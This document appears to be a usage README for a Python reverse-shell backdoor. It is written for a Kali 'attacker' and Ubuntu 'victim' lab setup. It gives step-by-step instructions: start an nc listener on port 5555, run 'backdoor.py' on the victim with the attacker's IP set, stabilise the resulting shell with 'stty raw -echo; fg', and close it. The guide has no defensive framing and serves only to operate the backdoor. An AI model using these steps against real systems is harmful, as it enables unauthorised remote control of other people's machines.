

Steps to run the backdoor:

--KALI--
1. Start netcat in listening mode on port 5555 on attacker machine ('Kali') with the following command:	
	
	nc -l -v -p 5555

--VICTIM (UBUNTU)--
(assuming backdoor.py is already on victim machine)

2. On the victim machine ('Ubuntu'), ensure that the 'KALI_IP' variable is correctly set to your Kali's ip address. If needed, change the PORT variable to match the port used in step 1

3. run the backdoor with the following command:
	
	python3 backdoor.py

--KALI--
4. A shell should now be opened in Kali allowing access to the victim machine. 

IMPORTANT:
5. While the shell is now usable, we need to 'stabilize' it to allow use of tab completion, arrow keys, etc.

to do so: 
( on Kali machine, currently in reverse shell: )
 	
	5.1 - press 'Ctrl+Z'  to suspend the reverse shell and put it in the background
	5.2 - on the Kali command line, enter the following command: 
		
		stty raw -echo; fg
	
	this command prepares the terminal to correctly handle I/O of the reverse shell. 'fg' is used to bring the suspended reverse shell back to the foreground for use
	
	5.3 Back in the reverse shell, press 'Enter" again until the shell's command prompt appears, then type 'restart' to restart the shell. 

After the above steps, the reverse shell should be fully interactive and we should have proper character interpretation


TERMINATION OF REVERSE SHELL:
-----------------------------

To terminate the reverse shell, enter the '&' character in the shell. The socket connection is immediately closed.
 
NOTE: to reverse the changes made to terminal input (steps 5.1 -5.3), enter the following command in Kali's command line:
	
	stty sane


NOTES: 
------
- Should there be connection issues (e.g. the backdoor is ran when kali does not have listener set up), the program is designed to terminate without further actions/messages.  

- While the shell allows for most non-interactive (e.g. 'ls')  and interactive (e.g. 'cd') commands, certain applications are not able to be displayed on the kali machine - e.g. 'gedit' , where the gedit GUI opens in the victim machine instead. 

	- For editing text files, it is advised to use simpler applications like 'nano' or 'vi' instead, which has been tested and proven to work with this shell.

If 'gedit' or other similar applications has been opened through the shell and it is "stuck", simply 'CTRL+C' to return to the command prompt of the shell.


 
	